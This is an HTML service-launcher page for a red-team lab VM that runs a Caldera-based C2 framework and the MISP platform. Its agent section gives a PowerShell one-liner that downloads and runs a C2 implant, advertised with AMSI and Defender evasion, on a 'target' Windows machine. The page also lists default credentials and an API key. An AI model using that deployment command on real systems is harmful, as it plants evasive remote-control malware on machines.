<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Morgana VM - Service Launcher</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 40px 0;
        }
        
        h1 {
            font-size: 3rem;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .subtitle {
            color: #8892b0;
            font-size: 1.2rem;
        }
        
        .ip-display {
            background: rgba(255,255,255,0.1);
            border-radius: 10px;
            padding: 15px 30px;
            display: inline-block;
            margin-top: 20px;
            font-family: monospace;
            font-size: 1.1rem;
        }
        
        .ip-display span {
            color: #64ffda;
        }
        
        .services {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
            gap: 30px;
            margin-top: 40px;
        }
        
        .service-card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            transition: transform 0.3s, box-shadow 0.3s;
        }
        
        .service-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        
        .service-card.morgana {
            border-left: 4px solid #e94560;
        }
        
        .service-card.misp {
            border-left: 4px solid #64ffda;
        }
        
        .service-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .service-icon {
            width: 60px;
            height: 60px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.8rem;
        }
        
        .morgana .service-icon {
            background: linear-gradient(135deg, #e94560, #ff6b6b);
        }
        
        .misp .service-icon {
            background: linear-gradient(135deg, #64ffda, #00bfa5);
            color: #1a1a2e;
        }
        
        .service-title {
            font-size: 1.5rem;
            font-weight: 600;
        }
        
        .service-desc {
            color: #8892b0;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        .launch-btn {
            display: inline-block;
            padding: 15px 40px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            transition: all 0.3s;
            margin-bottom: 15px;
        }
        
        .morgana .launch-btn {
            background: linear-gradient(135deg, #e94560, #ff6b6b);
            color: white;
        }
        
        .misp .launch-btn {
            background: linear-gradient(135deg, #64ffda, #00bfa5);
            color: #1a1a2e;
        }
        
        .launch-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .url-display {
            background: rgba(0,0,0,0.3);
            padding: 10px 15px;
            border-radius: 6px;
            font-family: monospace;
            font-size: 0.9rem;
            color: #64ffda;
            word-break: break-all;
        }
        
        .credentials {
            background: rgba(255,193,7,0.1);
            border: 1px solid rgba(255,193,7,0.3);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
        }
        
        .credentials h4 {
            color: #ffc107;
            margin-bottom: 8px;
        }
        
        .credentials code {
            background: rgba(0,0,0,0.3);
            padding: 2px 8px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .info-section {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 30px;
            margin-top: 40px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .info-section h2 {
            color: #e94560;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .info-section h3 {
            color: #64ffda;
            margin: 25px 0 15px 0;
        }
        
        .info-section p, .info-section li {
            color: #8892b0;
            line-height: 1.8;
            margin-bottom: 10px;
        }
        
        .info-section ol, .info-section ul {
            padding-left: 25px;
        }
        
        .code-block {
            background: #0d1117;
            border-radius: 8px;
            padding: 15px 20px;
            margin: 15px 0;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 0.9rem;
            overflow-x: auto;
            border: 1px solid #30363d;
        }
        
        .code-block .comment {
            color: #8b949e;
        }
        
        .code-block .command {
            color: #79c0ff;
        }
        
        .code-block .string {
            color: #a5d6ff;
        }
        
        .code-block .var {
            color: #ffa657;
        }
        
        .warning-box {
            background: rgba(233, 69, 96, 0.1);
            border: 1px solid rgba(233, 69, 96, 0.3);
            border-radius: 8px;
            padding: 15px 20px;
            margin: 15px 0;
        }
        
        .warning-box strong {
            color: #e94560;
        }
        
        .success-box {
            background: rgba(100, 255, 218, 0.1);
            border: 1px solid rgba(100, 255, 218, 0.3);
            border-radius: 8px;
            padding: 15px 20px;
            margin: 15px 0;
        }
        
        .success-box strong {
            color: #64ffda;
        }
        
        .step-number {
            display: inline-block;
            width: 28px;
            height: 28px;
            background: #e94560;
            color: white;
            border-radius: 50%;
            text-align: center;
            line-height: 28px;
            font-weight: bold;
            margin-right: 10px;
        }
        
        footer {
            text-align: center;
            padding: 40px 0;
            color: #8892b0;
        }
        
        footer a {
            color: #64ffda;
            text-decoration: none;
        }
        
        .copy-btn {
            background: #30363d;
            border: none;
            color: #8892b0;
            padding: 5px 10px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
            float: right;
            transition: all 0.2s;
        }
        
        .copy-btn:hover {
            background: #484f58;
            color: #fff;
        }
        
        @media (max-width: 768px) {
            h1 {
                font-size: 2rem;
            }
            
            .services {
                grid-template-columns: 1fr;
            }
            
            .service-card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Morgana VM</h1>
            <p class="subtitle">Security Operations Center - Service Launcher</p>
            <div class="ip-display">
                VM IP Address: <span id="vm-ip">Loading...</span>
            </div>
        </header>
        
        <!-- VM Credentials Section -->
        <div class="info-section" style="margin-bottom: 30px;">
            <h2>&#128272; Access Credentials</h2>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 15px;">
                <div class="credentials">
                    <h4>Ubuntu VM (SSH/Console)</h4>
                    <p>Username: <code>morgana</code> | Password: <code>morgana</code></p>
                </div>
                <div class="credentials">
                    <h4>Morgana Arsenal (Web UI)</h4>
                    <p>Username: <code>morgana</code> | Password: <code>morgana</code></p>
                </div>
                <div class="credentials">
                    <h4>MISP (Web UI)</h4>
                    <p>Username: <code>admin@admin.test</code> | Password: <code>admin</code></p>
                </div>
            </div>
        </div>

        <div class="services">
            <!-- Morgana Arsenal Card -->
            <div class="service-card morgana">
                <div class="service-header">
                    <div class="service-icon">&#9876;</div>
                    <div>
                        <h2 class="service-title">Morgana Arsenal</h2>
                        <small style="color: #8892b0;">C2 Framework (Caldera Fork)</small>
                    </div>
                </div>
                <p class="service-desc">
                    Command & Control framework for red team operations. Deploy Merlino agents, 
                    create adversary profiles, and execute MITRE ATT&CK techniques.
                </p>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <a id="morgana-link" href="#" class="launch-btn" target="_blank">Launch (External IP)</a>
                    <a href="http://localhost:8888" class="launch-btn" style="background: linear-gradient(135deg, #28a745, #20c997);" target="_blank">Launch (Localhost)</a>
                </div>
                <div class="url-display"><strong>External IP:</strong> <span id="morgana-url">https://192.168.124.133</span></div>
                <div class="url-display" style="margin-top: 5px;"><strong>Localhost:</strong> http://localhost:8888</div>
                <div class="credentials">
                    <h4>Default Credentials</h4>
                    <p>Username: <code>admin</code> | Password: <code>admin</code></p>
                </div>
            </div>
            
            <!-- MISP Card -->
            <div class="service-card misp">
                <div class="service-header">
                    <div class="service-icon">&#128270;</div>
                    <div>
                        <h2 class="service-title">MISP</h2>
                        <small style="color: #8892b0;">Threat Intelligence Platform</small>
                    </div>
                </div>
                <p class="service-desc">
                    Malware Information Sharing Platform for collecting, storing, and correlating 
                    Indicators of Compromise (IOCs) and threat intelligence.
                </p>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <a id="misp-link" href="#" class="launch-btn" target="_blank">Launch (External IP)</a>
                    <a href="http://localhost:8080" class="launch-btn" style="background: linear-gradient(135deg, #28a745, #20c997);" target="_blank">Launch (Localhost)</a>
                </div>
                <div class="url-display"><strong>External IP:</strong> <span id="misp-url">https://192.168.124.133:8443</span></div>
                <div class="url-display" style="margin-top: 5px;"><strong>Localhost:</strong> http://localhost:8080</div>
                <div class="credentials">
                    <h4>Default Credentials</h4>
                    <p>Username: <code>admin@admin.test</code> | Password: <code>admin</code></p>
                    <p style="margin-top: 8px;"><strong>API Key:</strong> <code>3B1Vnm9Il6Gaj3LRoS3qeRtwT8uHLoqWOK6z5Wjm</code></p>
                </div>
            </div>
        </div>
        
        <!-- VM Service Guide Panel -->
        <div style="text-align: center; margin: 40px 0;">
            <a href="vm-services-guide.html" class="launch-btn" style="background: linear-gradient(135deg, #ffc107, #ff9800); color: #1a1a2e; padding: 20px 50px; font-size: 1.3rem; display: inline-block; box-shadow: 0 10px 30px rgba(255,193,7,0.3);" target="_blank">
                VM SERVICE GUIDE
            </a>
            <p style="color: #8892b0; margin-top: 15px;">Complete documentation for managing all VM services, troubleshooting, and configuration</p>
        </div>
        
        <!-- Merlino Configuration Section -->
        <div class="info-section">
            <h2>&#128296; Merlino Agent Configuration</h2>
            <p>To deploy the Merlino C# agent on a Windows target and connect it to Morgana Arsenal:</p>
            
            <h3>One-Line Deployment (PowerShell)</h3>
            <div class="code-block">
                <button class="copy-btn" onclick="copyMerlinoCommand()">Copy</button>
                <span class="comment"># Run this in PowerShell on the target Windows machine</span><br>
                <span class="var">$s</span>=<span class="string" id="merlino-server">"192.168.124.133"</span>;<span class="command">curl.exe</span> -k -H <span class="string">"file: Merlino.exe"</span> <span class="string" id="merlino-download">"https://192.168.124.133/file/download"</span> -o Merlino.exe;.\Merlino.exe -server <span class="string" id="merlino-connect">"https://192.168.124.133"</span>
            </div>
            
            <h3>Manual Agent Execution</h3>
            <div class="code-block">
                <span class="comment"># With custom group and sleep interval</span><br>
                .\Merlino.exe -server <span class="string" id="merlino-manual">"https://192.168.124.133"</span> -group <span class="string">"red"</span> -sleep <span class="string">60</span>
            </div>
            
            <div class="success-box">
                <strong>Agent Features:</strong> AMSI/ETW bypass, 16KB size, Windows Defender evasion, HTTPS encrypted communication on port 443.
            </div>
        </div>
        
        <!-- Certificate Installation Section -->
        <div class="info-section">
            <h2>&#128274; SSL Certificate Installation (Windows)</h2>
            <p>Since we use a self-signed certificate, you need to install it to avoid browser warnings when accessing externally via Google Chrome.</p>
            
            <h3>Step 1: Download the Certificate</h3>
            <ol>
                <li>Open Google Chrome and navigate to <span class="url-display" style="display: inline; padding: 5px 10px;" id="cert-url">https://192.168.124.133</span></li>
                <li>Click on <strong>"Not secure"</strong> or the padlock icon in the address bar</li>
                <li>Click <strong>"Certificate is not valid"</strong></li>
                <li>Go to the <strong>"Details"</strong> tab</li>
                <li>Click <strong>"Export..."</strong> or <strong>"Copy to File..."</strong></li>
                <li>Save the certificate as <code>morgana-cert.cer</code></li>
            </ol>
            
            <h3>Step 2: Install the Certificate</h3>
            <ol>
                <li><span class="step-number">1</span>Double-click the downloaded <code>morgana-cert.cer</code> file</li>
                <li><span class="step-number">2</span>Click <strong>"Install Certificate..."</strong></li>
                <li><span class="step-number">3</span>Select <strong>"Local Machine"</strong> (requires Administrator privileges)</li>
                <li><span class="step-number">4</span>Click <strong>"Next"</strong></li>
                <li><span class="step-number">5</span>Select <strong>"Place all certificates in the following store"</strong></li>
                <li><span class="step-number">6</span>Click <strong>"Browse..."</strong></li>
                <li><span class="step-number">7</span>Select <strong>"Trusted Root Certification Authorities"</strong></li>
                <li><span class="step-number">8</span>Click <strong>"OK"</strong>, then <strong>"Next"</strong>, then <strong>"Finish"</strong></li>
                <li><span class="step-number">9</span>Confirm the security warning by clicking <strong>"Yes"</strong></li>
            </ol>
            
            <div class="warning-box">
                <strong>Important:</strong> After installing the certificate, close ALL Chrome windows completely and reopen the browser. You may also need to clear the browser cache (Ctrl+Shift+Delete).
            </div>
            
            <h3>Alternative: Accept Certificate in Browser (Quick Method)</h3>
            <p>If you don't want to install the certificate permanently:</p>
            <ol>
                <li>When Chrome shows <strong>"Your connection is not private"</strong></li>
                <li>Click <strong>"Advanced"</strong></li>
                <li>Click <strong>"Proceed to [IP address] (unsafe)"</strong></li>
            </ol>
            <p style="color: #ffc107;"><em>Note: You'll need to do this every time the browser session expires.</em></p>
            
            <h3>For MISP (Port 8443)</h3>
            <p>Repeat the same process for MISP at <span class="url-display" style="display: inline; padding: 5px 10px;" id="misp-cert-url">https://192.168.124.133:8443</span></p>
            <p>Both services use the same SSL certificate, so installing it once should work for both.</p>
        </div>
        
        <!-- Quick Reference Section -->
        <div class="info-section">
            <h2>&#128218; Quick Reference</h2>
            
            <h3>Service URLs</h3>
            <table style="width: 100%; border-collapse: collapse; margin: 15px 0;">
                <tr style="background: rgba(0,0,0,0.3);">
                    <th style="padding: 12px; text-align: left; color: #64ffda;">Service</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda;">Internal URL</th>
                    <th style="padding: 12px; text-align: left; color: #64ffda;">External URL</th>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                    <td style="padding: 12px;">Morgana Arsenal</td>
                    <td style="padding: 12px; font-family: monospace;">http://localhost:8888</td>
                    <td style="padding: 12px; font-family: monospace;" id="morgana-ext">https://192.168.124.133</td>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.1);">
                    <td style="padding: 12px;">MISP</td>
                    <td style="padding: 12px; font-family: monospace;">http://localhost:8080</td>
                    <td style="padding: 12px; font-family: monospace;" id="misp-ext">https://192.168.124.133:8443</td>
                </tr>
            </table>
            
            <h3>Service Management (SSH/Terminal)</h3>
            <div class="code-block">
                <span class="comment"># Check all services status</span><br>
                <span class="command">sudo systemctl status</span> nginx morgana-arsenal misp-workers misp-modules<br><br>
                <span class="comment"># Restart a service</span><br>
                <span class="command">sudo systemctl restart</span> morgana-arsenal<br>
                <span class="command">sudo systemctl restart</span> misp-workers misp-modules<br><br>
                <span class="comment"># View logs</span><br>
                <span class="command">journalctl -u</span> morgana-arsenal -f<br>
                <span class="command">tail -f</span> /home/morgana/morgana-arsenal/caldera-debug.log
            </div>
        </div>
        
        <footer>
            <p>Morgana Arsenal v1.0 | Based on MITRE Caldera v5.3.0</p>
            <p>Documentation: <a href="vm-services-guide.html">VM Services Guide</a> | <a href="VM_SERVICES_GUIDE.md">Markdown Version</a></p>
        </footer>
    </div>
    
    <script>
        // VM IP Address - hardcoded for reliability
        const VM_IP = '192.168.124.133';
        
        // Get the current VM IP address
        function getVMIP() {
            const currentHost = window.location.hostname;
            
            // If accessing from external IP, use that
            if (currentHost && currentHost !== 'localhost' && currentHost !== '127.0.0.1' && currentHost !== '') {
                return currentHost;
            }
            
            // Fallback to hardcoded IP
            return VM_IP;
        }
        
        function updateURLs() {
            const vmIP = getVMIP();
            
            // Update IP display
            document.getElementById('vm-ip').textContent = vmIP;
            
            // Update Morgana Arsenal URLs
            const morganaURL = `https://${vmIP}`;
            document.getElementById('morgana-link').href = morganaURL;
            document.getElementById('morgana-url').textContent = morganaURL;
            
            // Update MISP URLs
            const mispURL = `https://${vmIP}:8443`;
            document.getElementById('misp-link').href = mispURL;
            document.getElementById('misp-url').textContent = mispURL;
            
            // Update certificate URLs
            document.getElementById('cert-url').textContent = morganaURL;
            document.getElementById('misp-cert-url').textContent = mispURL;
            
            // Update Merlino commands
            document.getElementById('merlino-server').textContent = `"${vmIP}"`;
            document.getElementById('merlino-download').textContent = `"https://${vmIP}/file/download"`;
            document.getElementById('merlino-connect').textContent = `"https://${vmIP}"`;
            document.getElementById('merlino-manual').textContent = `"https://${vmIP}"`;
        }
        
        function copyMerlinoCommand() {
            const vmIP = getVMIP();
            const command = `$s="${vmIP}";curl.exe -k -H "file: Merlino.exe" "https://$s/file/download" -o Merlino.exe;.\\Merlino.exe -server "https://$s"`;
            
            navigator.clipboard.writeText(command).then(() => {
                const btn = document.querySelector('.copy-btn');
                btn.textContent = 'Copied!';
                btn.style.background = '#64ffda';
                btn.style.color = '#1a1a2e';
                
                setTimeout(() => {
                    btn.textContent = 'Copy';
                    btn.style.background = '#30363d';
                    btn.style.color = '#8892b0';
                }, 2000);
            });
        }
        
        // Initialize on page load
        document.addEventListener('DOMContentLoaded', updateURLs);
    </script>
</body>
</html>
